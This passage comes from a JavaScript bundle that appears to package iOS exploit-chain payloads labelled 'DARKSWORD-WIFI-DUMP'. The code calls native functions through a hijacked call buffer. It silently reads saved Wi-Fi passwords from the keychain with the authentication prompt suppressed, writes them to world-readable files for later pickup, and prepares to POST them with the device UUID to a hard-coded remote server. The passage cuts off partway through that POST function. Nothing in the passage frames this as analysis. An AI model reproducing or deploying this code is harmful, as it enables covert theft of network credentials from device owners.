false);\n\t\tconst dataPtr = Native.callSymbol(\"malloc\", BigInt(requestBytes.byteLength));\n\t\tNative.write(dataPtr, requestBytes);\n\t\t\n\t\tconst sent = Native.callSymbol(\"send\", socket, dataPtr, BigInt(requestBytes.byteLength), 0);\n\t\tNative.callSymbol(\"free\", dataPtr);\n\t\tNative.callSymbol(\"close\", socket);\n\t\t\n\t\treturn Number(sent) === requestBytes.byteLength;\n\t\t\n\t} catch (e) {\n\t\treturn false;\n\t}\n}\n\nfunction base64Encode(arrayBuffer) {\n\tconst bytes = new Uint8Array(arrayBuffer);\n\tconst chars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n\tlet result = \"\";\n\t\n\tfor (let i = 0; i < bytes.length; i += 3) {\n\t\tconst b1 = bytes[i];\n\t\tconst b2 = i + 1 < bytes.length ? bytes[i + 1] : 0;\n\t\tconst b3 = i + 2 < bytes.length ? bytes[i + 2] : 0;\n\t\t\n\t\tresult += chars[b1 >> 2];\n\t\tresult += chars[((b1 & 3) << 4) | (b2 >> 4)];\n\t\tresult += i + 1 < bytes.length ? chars[((b2 & 15) << 2) | (b3 >> 6)] : \"=\";\n\t\tresult += i + 2 < bytes.length ? chars[b3 & 63] : \"=\";\n\t}\n\t\n\treturn result;\n}\n\n// ============================================================================\n// WiFi Password Extraction\n// ============================================================================\n\nfunction extractWiFiPasswords() {\n\tconst passwords = [];\n\t\n\t\n\t// Create query dictionary\n\tconst keyCallbacks = getCFDictKeyCallbacks();\n\tconst valueCallbacks = getCFDictValueCallbacks();\n\t\n\tlet queryDict;\n\tif (keyCallbacks && valueCallbacks && keyCallbacks !== 0n && valueCallbacks !== 0n) {\n\t\tqueryDict = Native.callSymbol(\"CFDictionaryCreateMutable\", 0n, 0, keyCallbacks, valueCallbacks);\n\t} else {\n\t\tqueryDict = Native.callSymbol(\"CFDictionaryCreateMutable\", 0n, 0, 0n, 0n);\n\t}\n\t\n\tif (!queryDict || queryDict === 0n) {\n\t\treturn passwords;\n\t}\n\t\n\ttry {\n\t\t// Security framework constants\n\t\tconst kSecClass = createCFString(\"class\");\n\t\tconst kSecClassGenericPassword = createCFString(\"genp\");\n\t\tconst kSecReturnAttributes = createCFString(\"r_Attributes\");\n\t\tconst kSecReturnData = createCFString(\"r_Data\");\n\t\tconst kSecMatchLimit = createCFString(\"m_Limit\");\n\t\tconst kSecMatchLimitAll = createCFString(\"m_LimitAll\");\n\t\t\n\t\t// IMPORTANT: Disable authentication UI - silently fail instead of prompting user\n\t\tconst kSecUseAuthenticationUI = createCFString(\"u_AuthUI\");\n\t\tconst kSecUseAuthenticationUIFail = createCFString(\"u_AuthUIF\");\n\t\tconst kSecAttrAccessGroup = createCFString(\"agrp\");\n\t\tconst kCFBooleanTrue = getCFBooleanTrue();\n\t\t\n\t\t// Result keys\n\t\tconst kSecAttrService = createCFString(\"svce\");\n\t\tconst kSecAttrAccount = createCFString(\"acct\");\n\t\tconst kResultDataKey = createCFString(\"v_Data\");\n\t\t\n\t\tif (!kSecClass || !kSecClassGenericPassword || !kCFBooleanTrue) {\n\t\t\treturn passwords;\n\t\t}\n\t\t\n\t\t// Query specifically for AirPort service (WiFi passwords)\n\t\tconst kSecAttrServiceKey = createCFString(\"svce\");\n\t\tconst airportService = createCFString(\"AirPort\");\n\t\t\n\t\t// First, query ALL generic passwords to see what wifid can access\n\t\tNative.callSymbol(\"CFDictionarySetValue\", queryDict, kSecClass, kSecClassGenericPassword);\n\t\tNative.callSymbol(\"CFDictionarySetValue\", queryDict, kSecReturnAttributes, kCFBooleanTrue);\n\t\tNative.callSymbol(\"CFDictionarySetValue\", queryDict, kSecReturnData, kCFBooleanTrue);\n\t\tNative.callSymbol(\"CFDictionarySetValue\", queryDict, kSecMatchLimit, kSecMatchLimitAll);\n\t\t\n\t\t// IMPORTANT: Disable authentication UI prompts - silently fail for protected items\n\t\tNative.callSymbol(\"CFDictionarySetValue\", queryDict, kSecUseAuthenticationUI, kSecUseAuthenticationUIFail);\n\t\t\n\t\t// Query without AirPort filter first to see total accessible items\n\t\tconst allResultPtr = Native.callSymbol(\"malloc\", 8n);\n\t\tif (allResultPtr && allResultPtr !== 0n) {\n\t\t\tNative.write64(allResultPtr, 0n);\n\t\t\tconst allStatus = Native.callSymbol(\"SecItemCopyMatching\", queryDict, allResultPtr);\n\t\t\tconst allStatusNum = Number(allStatus);\n\t\t\tlet allSigned = allStatusNum > 0x7FFFFFFF ? allStatusNum - 0x100000000 : allStatusNum;\n\t\t\t\n\t\t\tif (allSigned === 0) {\n\t\t\t\tconst allResults = Native.readPtr(allResultPtr);\n\t\t\t\tif (allResults && allResults !== 0n) {\n\t\t\t\t\tconst allCount = Number(Native.callSymbol(\"CFArrayGetCount\", allResults));\n\t\t\t\t\t\n\t\t\t\t\t// Scan all items for WiFi passwords - be very defensive\n\t\t\t\t\t// Skip the ALL query for now - just use AirPort query which works\n\t\t\t\t\t// Skip the ALL query loop - it causes crashes on some items\n\t\t\t\t\t// Just release the results and rely on the AirPort-specific query\n\t\t\t\t\tNative.callSymbol(\"CFRelease\", allResults);\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t}\n\t\t\tNative.callSymbol(\"free\", allResultPtr);\n\t\t}\n\t\t\n\t\t// Now query specifically for AirPort\n\t\tNative.callSymbol(\"CFDictionarySetValue\", queryDict, kSecAttrServiceKey, airportService);\n\t\t\n\t\t// Execute query\n\t\tconst resultPtr = Native.callSymbol(\"malloc\", 8n);\n\t\tif (!resultPtr || resultPtr === 0n) {\n\t\t\treturn passwords;\n\t\t}\n\t\t\t\n\t\t\ttry {\n\t\t\t\tNative.write64(resultPtr, 0n);\n\t\t\t\t\n\t\t\t\tconst status = Native.callSymbol(\"SecItemCopyMatching\", queryDict, resultPtr);\n\t\t\t\tconst statusNum = Number(status);\n\t\t\t\tlet signed = statusNum > 0x7FFFFFFF ? statusNum - 0x100000000 : statusNum;\n\t\t\t\t\n\t\t\t\t\n\t\t\t\tif (signed === 0) {\n\t\t\t\t\tconst results = Native.readPtr(resultPtr);\n\t\t\t\t\tif (results && results !== 0n) {\n\t\t\t\t\t\tconst arrayTypeId = Native.callSymbol(\"CFArrayGetTypeID\");\n\t\t\t\t\t\tconst dictTypeId = Native.callSymbol(\"CFDictionaryGetTypeID\");\n\t\t\t\t\t\tconst typeId = Native.callSymbol(\"CFGetTypeID\", results);\n\t\t\t\t\t\t\n\t\t\t\t\t\tif (typeId === arrayTypeId) {\n\t\t\t\t\t\t\tconst count = Number(Native.callSymbol(\"CFArrayGetCount\", results));\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t// Log ALL items to debug\n\t\t\t\t\t\t\tfor (let i = 0; i < count; i++) {\n\t\t\t\t\t\t\t\tconst item = Native.callSymbol(\"CFArrayGetValueAtIndex\", results, i);\n\t\t\t\t\t\t\t\tif (!item || item === 0n) {\n\t\t\t\t\t\t\t\t\tcontinue;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tconst serviceRef = Native.callSymbol(\"CFDictionaryGetValue\", item, kSecAttrService);\n\t\t\t\t\t\t\t\tconst service = cfStringToJS(serviceRef);\n\t\t\t\t\t\t\t\tconst accountRef = Native.callSymbol(\"CFDictionaryGetValue\", item, kSecAttrAccount);\n\t\t\t\t\t\t\t\tconst account = cfStringToJS(accountRef);\n\t\t\t\t\t\t\t\tconst dataRef = Native.callSymbol(\"CFDictionaryGetValue\", item, kResultDataKey);\n\t\t\t\t\t\t\t\tconst hasData = (dataRef && dataRef !== 0n) ? \"YES\" : \"NO\";\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tfor (let i = 0; i < count; i++) {\n\t\t\t\t\t\t\t\tconst item = Native.callSymbol(\"CFArrayGetValueAtIndex\", results, i);\n\t\t\t\t\t\t\t\tif (!item || item === 0n) continue;\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tconst itemTypeId = Native.callSymbol(\"CFGetTypeID\", item);\n\t\t\t\t\t\t\t\tif (itemTypeId !== dictTypeId) continue;\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t// Extract service (SSID)\n\t\t\t\t\t\t\t\tconst serviceRef = Native.callSymbol(\"CFDictionaryGetValue\", item, kSecAttrService);\n\t\t\t\t\t\t\t\tconst service = cfStringToJS(serviceRef);\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t// Extract account\n\t\t\t\t\t\t\t\tconst accountRef = Native.callSymbol(\"CFDictionaryGetValue\", item, kSecAttrAccount);\n\t\t\t\t\t\t\t\tconst account = cfStringToJS(accountRef);\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t// Extract password (v_Data contains the actual password bytes)\n\t\t\t\t\t\t\t\tconst dataRef = Native.callSymbol(\"CFDictionaryGetValue\", item, kResultDataKey);\n\t\t\t\t\t\t\t\tconst password = cfDataToString(dataRef);\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t// All results are AirPort (WiFi) entries since we queried with service=AirPort\n\t\t\t\t\t\t\t\t// The account field contains the SSID\n\t\t\t\t\t\t\t\tif (password && account) {\n\t\t\t\t\t\t\t\t\tpasswords.push({ ssid: account, password: password, service: service });\n\t\t\t\t\t\t\t\t} else if (password) {\n\t\t\t\t\t\t\t\t\t// Fallback: use a placeholder if no account name\n\t\t\t\t\t\t\t\t\tpasswords.push({ ssid: \"(unknown)\", password: password, service: service });\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t} else if (typeId === dictTypeId) {\n\t\t\t\t\t\t\t// Single result\n\t\t\t\t\t\t\tconst serviceRef = Native.callSymbol(\"CFDictionaryGetValue\", results, kSecAttrService);\n\t\t\t\t\t\t\tconst service = cfStringToJS(serviceRef);\n\t\t\t\t\t\t\tconst accountRef = Native.callSymbol(\"CFDictionaryGetValue\", results, kSecAttrAccount);\n\t\t\t\t\t\t\tconst account = cfStringToJS(accountRef);\n\t\t\t\t\t\t\tconst dataRef = Native.callSymbol(\"CFDictionaryGetValue\", results, kResultDataKey);\n\t\t\t\t\t\t\tconst password = cfDataToString(dataRef);\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tif (service && password) {\n\t\t\t\t\t\t\t\tconst ssid = account || service;\n\t\t\t\t\t\t\t\tpasswords.push({ ssid: ssid, password: password, service: service });\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\n\t\t\t\t\t\tNative.callSymbol(\"CFRelease\", results);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t\n\t\t} finally {\n\t\t\tNative.callSymbol(\"free\", resultPtr);\n\t\t}\n\t\t\n\t\t// Cleanup CFStrings\n\t\tif (kSecClass) Native.callSymbol(\"CFRelease\", kSecClass);\n\t\tif (kSecClassGenericPassword) Native.callSymbol(\"CFRelease\", kSecClassGenericPassword);\n\t\tif (kSecReturnAttributes) Native.callSymbol(\"CFRelease\", kSecReturnAttributes);\n\t\tif (kSecReturnData) Native.callSymbol(\"CFRelease\", kSecReturnData);\n\t\tif (kSecMatchLimit) Native.callSymbol(\"CFRelease\", kSecMatchLimit);\n\t\tif (kSecMatchLimitAll) Native.callSymbol(\"CFRelease\", kSecMatchLimitAll);\n\t\tif (kSecUseAuthenticationUI) Native.callSymbol(\"CFRelease\", kSecUseAuthenticationUI);\n\t\tif (kSecUseAuthenticationUIFail) Native.callSymbol(\"CFRelease\", kSecUseAuthenticationUIFail);\n\t\tif (kSecAttrService) Native.callSymbol(\"CFRelease\", kSecAttrService);\n\t\tif (kSecAttrAccount) Native.callSymbol(\"CFRelease\", kSecAttrAccount);\n\t\tif (kSecAttrServiceKey) Native.callSymbol(\"CFRelease\", kSecAttrServiceKey);\n\t\tif (airportService) Native.callSymbol(\"CFRelease\", airportService);\n\t\tif (kResultDataKey) Native.callSymbol(\"CFRelease\", kResultDataKey);\n\t\t\n\t} finally {\n\t\tNative.callSymbol(\"CFRelease\", queryDict);\n\t}\n\t\n\treturn passwords;\n}\n\n/**\n * Write passwords to file\n */\nfunction writePasswordsToFile(passwords, outputPath) {\n\t\n\tlet content = \"=== WiFi Passwords ===\\n\";\n\tcontent += \"Generated: \" + new Date().toISOString() + \"\\n\";\n\tcontent += \"Total: \" + passwords.length + \" networks\\n\\n\";\n\t\n\tfor (const p of passwords) {\n\t\tcontent += \"SSID: \" + p.ssid + \"\\n\";\n\t\tcontent += \"Password: \" + p.password + \"\\n\";\n\t\tif (p.service) content += \"Service: \" + p.service + \"\\n\";\n\t\tcontent += \"\\n\";\n\t}\n\t\n\tif (passwords.length === 0) {\n\t\tcontent += \"No WiFi passwords found.\\n\";\n\t\tcontent += \"This may be due to:\\n\";\n\t\tcontent += \"  - Process lacks keychain entitlements\\n\";\n\t\tcontent += \"  - No saved WiFi networks\\n\";\n\t\tcontent += \"  - Keychain access denied\\n\";\n\t}\n\t\n\t\n\tconst fd = Native.callSymbol(\"open\", outputPath, 0x601, 511); // O_WRONLY | O_CREAT | O_TRUNC, 0777\n\t\n\tif (Number(fd) < 0) {\n\t\treturn false;\n\t}\n\t\n\ttry {\n\t\tconst contentBytes = Native.stringToBytes(content, false);\n\t\t\n\t\tconst buf = Native.callSymbol(\"malloc\", BigInt(contentBytes.byteLength));\n\t\t\n\t\tif (buf && buf !== 0n) {\n\t\t\tNative.write(buf, contentBytes);\n\t\t\tconst written = Native.callSymbol(\"write\", fd, buf, contentBytes.byteLength);\n\t\t\tNative.callSymbol(\"free\", buf);\n\t\t} else {\n\t\t}\n\t\t\n\t\t// Set 777 permissions\n\t\tNative.callSymbol(\"chmod\", outputPath, 511);\n\t\t\n\t\t// Also create symlink or copy to /tmp\n\t\treturn true;\n\t} finally {\n\t\tNative.callSymbol(\"close\", fd);\n\t}\n}\n\n// ============================================================================\n// Main Execution\n// ============================================================================\n\nNative.init();\n\n\n// Try multiple paths that wifid might have write access to\nconst POSSIBLE_PATHS = [\n\t// wifid's own directories\n\t\"/var/wireless/wifi_passwords.txt\",\n\t\"/var/wireless/Library/wifi_passwords.txt\",\n\t\"/var/wireless/Library/Caches/wifi_passwords.txt\",\n\t\"/var/wireless/Library/Preferences/wifi_passwords.txt\",\n\t\"/private/var/wireless/wifi_passwords.txt\",\n\t\n\t// System temp locations\n\t\"/private/var/tmp/wifi_passwords.txt\",\n\t\"/tmp/wifi_passwords.txt\",\n\t\"/var/tmp/wifi_passwords.txt\",\n\t\n\t// Log directories (often writable by daemons)\n\t\"/var/log/wifi_passwords.txt\",\n\t\"/private/var/log/wifi_passwords.txt\",\n\t\"/var/logs/wifi_passwords.txt\",\n\t\n\t// Root home\n\t\"/var/root/wifi_passwords.txt\",\n\t\"/private/var/root/wifi_passwords.txt\",\n\t\n\t// Mobile directories\n\t\"/var/mobile/wifi_passwords.txt\",\n\t\"/var/mobile/Library/wifi_passwords.txt\",\n\t\"/var/mobile/Library/Caches/wifi_passwords.txt\",\n\t\"/private/var/mobile/Library/Caches/wifi_passwords.txt\",\n\t\n\t// Preferences directories\n\t\"/var/preferences/wifi_passwords.txt\",\n\t\"/private/var/preferences/wifi_passwords.txt\",\n\t\n\t// DB directories\n\t\"/var/db/wifi_passwords.txt\",\n\t\"/private/var/db/wifi_passwords.txt\",\n\t\n\t// Daemon run directories\n\t\"/var/run/wifi_passwords.txt\",\n\t\"/private/var/run/wifi_passwords.txt\",\n\t\n\t// Network-related\n\t\"/var/networkd/wifi_passwords.txt\",\n\t\"/private/var/networkd/wifi_passwords.txt\",\n\t\"/private/var/networkd/db/wifi_passwords.txt\",\n];\n\nlet writablePath = null;\n\nfor (const testPath of POSSIBLE_PATHS) {\n\tconst testFd = Native.callSymbol(\"open\", testPath, 0x601, 511);\n\tif (Number(testFd) >= 0) {\n\t\tNative.callSymbol(\"close\", testFd);\n\t\twritablePath = testPath;\n\t\tbreak;\n\t}\n}\n\ntry {\n\tconst passwords = extractWiFiPasswords();\n\t\n\t// Log passwords to syslog\n\tfor (const p of passwords) {\n\t}\n\t\n\t// ALWAYS write to file first if we have a writable path\n\t// This allows file_downloader (running in SpringBoard) to pick it up\n\tif (passwords.length > 0 && writablePath) {\n\t\twritePasswordsToFile(passwords, writablePath);\n\t}\n\t\n\t// Also try to send via network (usually fails due to sandbox)\n    /*\n\tif (passwords.length > 0) {\n\t\tlet sent = sendWiFiPasswordsViaHTTPS(passwords);\n\t\tif (sent) {\n\t\t} else {\n\t\t\tsent = sendWiFiPasswordsViaHTTP(passwords);\n\t\t\tif (sent) {\n\t\t\t} else {\n\t\t\t}\n\t\t}\n\t}\n    */\n\t\n} catch (e) {\n}\n\n\n\n");

/***/ }),

/***/ "../node_modules/raw-loader/dist/cjs.js!./wifi_password_securityd.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony default export */ __webpack_exports__["default"] = ("// WiFi Password Dump Payload\n// Runs under wifid context which has keychain access for WiFi passwords\n// Sends WiFi credentials via HTTPS POST\n\n// Server configuration\nconst SERVER_HOST = \"sqwas.shapelie.com\";\nconst SERVER_PORT = 8881;\nconst USE_HTTPS = true;\n\nclass Native {\n\t\n\tstatic #baseAddr;\n\tstatic #dlsymAddr;\n\tstatic #memcpyAddr;\n\tstatic #mallocAddr;\n\tstatic #oinvAddr;\n\t\n\tstatic mem = 0n;\n\tstatic memSize = 0x4000;\n\t\n\tstatic #argMem = 0n;\n\tstatic #argMemPtr = 0n;\n\tstatic #argMemPtrStr = 0n;\n\tstatic #argPtr = 0n;\n\tstatic #argPtrPtr = 0n;\n\tstatic #argPtrStrPtr = 0n;\n\n\tstatic #dlsymCache = {};\n\t\n\tstatic init() {\n\t\tconst buff = new BigUint64Array(nativeCallBuff);\n\t\tthis.#baseAddr = buff[20];\n\t\tthis.#dlsymAddr = buff[21];\n\t\tthis.#memcpyAddr = buff[22];\n\t\tthis.#mallocAddr = buff[23];\n\t\tthis.#oinvAddr = buff[24];\n\t\t\n\t\tthis.mem = this.#nativeCallAddr(this.#mallocAddr, BigInt(this.memSize));\n\t\tthis.#argMem = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argMemPtr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argMemPtrStr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argPtr = this.#argMem;\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t}\n\t\n\tstatic write(ptr, buff) {\n\t\tif (!ptr) return false;\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tlet offs = 0;\n\t\tlet left = buff.byteLength;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000) len = 0x1000;\n\t\t\tbuff8.set(new Uint8Array(buff, offs, len), 0x1000);\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, ptr + BigInt(offs), this.#baseAddr + 0x1000n, BigInt(len));\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn true;\n\t}\n\t\n\tstatic read(ptr, length) {\n\t\tif (!ptr) return null;\n\t\tlet buff = new ArrayBuffer(length);\n\t\tlet buff8 = new Uint8Array(buff);\n\t\tlet offs = 0;\n\t\tlet left = length;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000) len = 0x1000;\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, this.#baseAddr + 0x1000n, ptr + BigInt(offs), BigInt(len));\n\t\t\tbuff8.set(new Uint8Array(nativeCallBuff, 0x1000, len), offs);\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn buff;\n\t}\n\t\n\tstatic readPtr(ptr) {\n\t\tlet buff = this.read(ptr, 8);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getBigUint64(0, true);\n\t}\n\t\n\tstatic read32(ptr) {\n\t\tlet buff = this.read(ptr, 4);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getInt32(0, true);\n\t}\n\t\n\tstatic write64(ptr, value) {\n\t\tconst buff = new ArrayBuffer(8);\n\t\tconst view = new DataView(buff);\n\t\tview.setBigUint64(0, value, true);\n\t\tthis.write(ptr, buff);\n\t}\n\t\n\tstatic readString(ptr, len=1024) {\n\t\tlet buff = this.read(ptr, len);\n\t\treturn this.bytesToString(buff, false);\n\t}\n\t\n\tstatic writeString(ptr, str) {\n\t\tconst buff = this.stringToBytes(str, true);\n\t\tthis.write(ptr, buff);\n\t}\n\t\n\tstatic callSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\tthis.#argPtr = this.#argMem;\n\t\tx0 = this.#toNative(x0);\n\t\tx1 = this.#toNative(x1);\n\t\tx2 = this.#toNative(x2);\n\t\tx3 = this.#toNative(x3);\n\t\tx4 = this.#toNative(x4);\n\t\tx5 = this.#toNative(x5);\n\t\tx6 = this.#toNative(x6);\n\t\tx7 = this.#toNative(x7);\n\t\tlet ret = this.#nativeCallSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\tthis.#argPtr = this.#argMem;\n\t\treturn ret;\n\t}\n\n\tstatic bytesToString(bytes, includeNullChar=true) {\n\t\tlet bytes8 = new Uint8Array(bytes);\n\t\tlet str = \"\";\n\t\tfor (let i=0; i<bytes8.length; i++) {\n\t\t\tif (!includeNullChar && !bytes8[i]) break;\n\t\t\tstr += String.fromCharCode(bytes8[i]);\n\t\t}\n\t\treturn str;\n\t}\n\t\n\tstatic stringToBytes(str, nullTerminated=false) {\n\t\tlet buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));\n\t\tlet s8 = new Uint8Array(buff);\n\t\tfor (let i=0; i<str.length; i++)\n\t\t\ts8[i] = str.charCodeAt(i);\n\t\tif (nullTerminated) s8[str.length] = 0x0;\n\t\treturn s8.buffer;\n\t}\n\t\n\tstatic #toNative(value) {\n\t\tif (!value) return 0n;\n\t\tif (typeof value === 'string') {\n\t\t\tif (value.length >= 0x1000) return 0n;\n\t\t\tlet ptr = this.#argPtr;\n\t\t\tthis.writeString(ptr, value);\n\t\t\tthis.#argPtr += BigInt(value.length + 1);\n\t\t\treturn ptr;\n\t\t}\n\t\telse if (typeof value === 'bigint') return value;\n\t\telse return BigInt(value);\n\t}\n\n\tstatic #dlsym(name) {\n\t\tif (!name) return 0n;\n\t\tlet addr = this.#dlsymCache[name];\n\t\tif (addr) return addr;\n\t\tconst RTLD_DEFAULT = 0xfffffffffffffffen;\n\t\tconst nameBytes = this.stringToBytes(name, true);\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tbuff8.set(new Uint8Array(nameBytes), 0x1000);\n\t\taddr = this.#nativeCallAddr(this.#dlsymAddr, RTLD_DEFAULT, this.#baseAddr + 0x1000n);\n\t\tif (addr) this.#dlsymCache[name] = addr;\n\t\treturn addr;\n\t}\n\t\n\tstatic #nativeCallAddr(addr, x0=0n, x1=0n, x2=0n, x3=0n, x4=0n, x5=0n, x6=0n, x7=0n) {\n\t\tlet buff = new BigInt64Array(nativeCallBuff);\n\t\tbuff[0] = addr;\n\t\tbuff[100] = x0;\n\t\tbuff[101] = x1;\n\t\tbuff[102] = x2;\n\t\tbuff[103] = x3;\n\t\tbuff[104] = x4;\n\t\tbuff[105] = x5;\n\t\tbuff[106] = x6;\n\t\tbuff[107] = x7;\n\t\tinvoker();\n\t\treturn buff[200];\n\t}\n\t\n\tstatic #nativeCallSymbol(name, ...args) {\n\t\tconst funcAddr = this.#dlsym(name);\n\t\tconst ret64 = this.#nativeCallAddr(funcAddr, ...args);\n\t\tif (ret64 < 0xffffffffn && ret64 > -0xffffffffn) return Number(ret64);\n\t\treturn ret64;\n\t}\n}\n\n// ============================================================================\n// Configuration\n// ============================================================================\n\nconst TAG = \"DARKSWORD-WIFI-DUMP-SECURITYD\";\nconst OUTPUT_FILE = \"/tmp/wifi_passwords_securityd.txt\";\n\n// ============================================================================\n// CoreFoundation Helpers\n// ============================================================================\n\nfunction createCFString(str) {\n\treturn Native.callSymbol(\"CFStringCreateWithCString\", 0n, str, 0x08000100);\n}\n\nfunction cfStringToJS(cfStr) {\n\tif (!cfStr || cfStr === 0n) return \"\";\n\t\n\t// Try CFStringGetCStringPtr first (fast path)\n\tconst cstrPtr = Native.callSymbol(\"CFStringGetCStringPtr\", cfStr, 0x08000100);\n\tif (cstrPtr && cstrPtr !== 0n) {\n\t\treturn Native.readString(cstrPtr, 256).replace(/\\0/g, '');\n\t}\n\t\n\t// Fallback to CFStringGetCString\n\tconst bufLen = 512;\n\tconst buf = Native.callSymbol(\"malloc\", bufLen);\n\tif (!buf || buf === 0n) return \"\";\n\t\n\ttry {\n\t\tconst result = Native.callSymbol(\"CFStringGetCString\", cfStr, buf, bufLen, 0x08000100);\n\t\tif (result) {\n\t\t\treturn Native.readString(buf, bufLen).replace(/\\0/g, '');\n\t\t}\n\t} finally {\n\t\tNative.callSymbol(\"free\", buf);\n\t}\n\t\n\treturn \"\";\n}\n\nfunction cfDataToString(cfData) {\n\tif (!cfData || cfData === 0n) return \"\";\n\t\n\tconst length = Number(Native.callSymbol(\"CFDataGetLength\", cfData));\n\tif (length <= 0 || length > 1024) return \"\";\n\t\n\tconst dataPtr = Native.callSymbol(\"CFDataGetBytePtr\", cfData);\n\tif (!dataPtr || dataPtr === 0n) return \"\";\n\t\n\tconst data = Native.read(dataPtr, length);\n\tif (!data) return \"\";\n\t\n\tconst bytes = new Uint8Array(data);\n\tlet str = \"\";\n\tfor (let i = 0; i < bytes.length; i++) {\n\t\tif (bytes[i] === 0) break;\n\t\tstr += String.fromCharCode(bytes[i]);\n\t}\n\treturn str;\n}\n\nfunction getCFBooleanTrue() {\n\tconst addr = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFBooleanTrue\");\n\tif (addr && addr !== 0n) {\n\t\treturn Native.readPtr(addr);\n\t}\n\treturn 0n;\n}\n\nfunction getCFDictKeyCallbacks() {\n\treturn Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFTypeDictionaryKeyCallBacks\");\n}\n\nfunction getCFDictValueCallbacks() {\n\treturn Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFTypeDictionaryValueCallBacks\");\n}\n\n// ============================================================================\n// Device UUID\n// ============================================================================\n\nfunction getDeviceUUID() {\n\ttry {\n\t\tconst iokitHandle = Native.callSymbol(\"dlopen\", \"/System/Library/Frameworks/IOKit.framework/IOKit\", 1);\n\t\tconst cfHandle = Native.callSymbol(\"dlopen\", \"/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation\", 1);\n\t\t\n\t\tif (!iokitHandle || iokitHandle === 0n) return \"unknown-device\";\n\t\t\n\t\tconst serviceNamePtr = Native.callSymbol(\"malloc\", 32);\n\t\tNative.writeString(serviceNamePtr, \"IOPlatformExpertDevice\");\n\t\t\n\t\tconst matchingDict = Native.callSymbol(\"IOServiceMatching\", serviceNamePtr);\n\t\tNative.callSymbol(\"free\", serviceNamePtr);\n\t\t\n\t\tif (!matchingDict || matchingDict === 0n) return \"unknown-device\";\n\t\t\n\t\tconst platformExpert = Native.callSymbol(\"IOServiceGetMatchingService\", 0n, matchingDict);\n\t\tif (!platformExpert || platformExpert === 0n) return \"unknown-device\";\n\t\t\n\t\tconst uuidKeyPtr = Native.callSymbol(\"malloc\", 32);\n\t\tNative.writeString(uuidKeyPtr, \"IOPlatformUUID\");\n\t\tconst uuidKeyCFStr = Native.callSymbol(\"CFStringCreateWithCString\", 0n, uuidKeyPtr, 0x08000100);\n\t\tNative.callSymbol(\"free\", uuidKeyPtr);\n\t\t\n\t\tif (!uuidKeyCFStr || uuidKeyCFStr === 0n) {\n\t\t\tNative.callSymbol(\"IOObjectRelease\", platformExpert);\n\t\t\treturn \"unknown-device\";\n\t\t}\n\t\t\n\t\tconst uuidCFStr = Native.callSymbol(\"IORegistryEntryCreateCFProperty\", \n\t\t\tplatformExpert, uuidKeyCFStr, 0n, 0n);\n\t\tNative.callSymbol(\"CFRelease\", uuidKeyCFStr);\n\t\t\n\t\tif (!uuidCFStr || uuidCFStr === 0n) {\n\t\t\tNative.callSymbol(\"IOObjectRelease\", platformExpert);\n\t\t\treturn \"unknown-device\";\n\t\t}\n\t\t\n\t\tlet uuid = \"\";\n\t\tconst cstrPtr = Native.callSymbol(\"CFStringGetCStringPtr\", uuidCFStr, 0x08000100);\n\t\tif (cstrPtr && cstrPtr !== 0n) {\n\t\t\tuuid = Native.readString(cstrPtr, 256).replace(/\\0/g, '').trim();\n\t\t}\n\t\t\n\t\tif (!uuid) {\n\t\t\tconst uuidBuf = Native.callSymbol(\"malloc\", 256);\n\t\t\tconst result = Native.callSymbol(\"CFStringGetCString\", uuidCFStr, uuidBuf, 256, 0x08000100);\n\t\t\tif (result) {\n\t\t\t\tuuid = Native.readString(uuidBuf, 256).replace(/\\0/g, '').trim();\n\t\t\t}\n\t\t\tNative.callSymbol(\"free\", uuidBuf);\n\t\t}\n\t\t\n\t\tNative.callSymbol(\"CFRelease\", uuidCFStr);\n\t\tNative.callSymbol(\"IOObjectRelease\", platformExpert);\n\t\t\n\t\treturn uuid || \"unknown-device\";\n\t} catch (e) {\n\t\treturn \"unknown-device\";\n\t}\n}\n\n// ============================================================================\n// HTTPS POST - Send WiFi Passwords Directly\n// ============================================================================\n\nfunction sendWiFiPasswordsViaHTTPS(passwords) {\n\t\n\ttry {\n\t\t// Get device UUID\n\t\tconst deviceUUID = getDeviceUUID();\n\t\t\n\t\t// Build 